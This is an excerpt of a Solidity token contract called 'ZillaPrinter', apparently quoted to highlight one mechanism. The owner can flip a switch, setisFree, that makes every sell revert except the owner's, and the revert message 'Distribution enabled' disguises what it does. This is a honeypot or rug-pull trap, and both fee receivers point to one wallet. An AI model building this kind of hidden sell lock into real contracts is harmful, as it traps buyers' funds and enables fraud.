...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0x19b676aB27A385B2a0D2f275dEca6CEBE9938539); 
...
contract ZillaPrinter is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0x19b676aB27A385B2a0D2f275dEca6CEBE9938539; 
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "ZillaPrinter";
    string constant _symbol = "ZILLAp";
    ...
    address public autoLiquidityReceiver=0xda1488bD9d305C9cDEB5cBA6abf04DbCED1fE42E;
    address public marketingFeeReceiver=0xda1488bD9d305C9cDEB5cBA6abf04DbCED1fE42E;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!isFree || sender==owner), "Distribution enabled");
    ...
    function setisFree(bool value) external onlyOwner {
        isFree = value;
    }
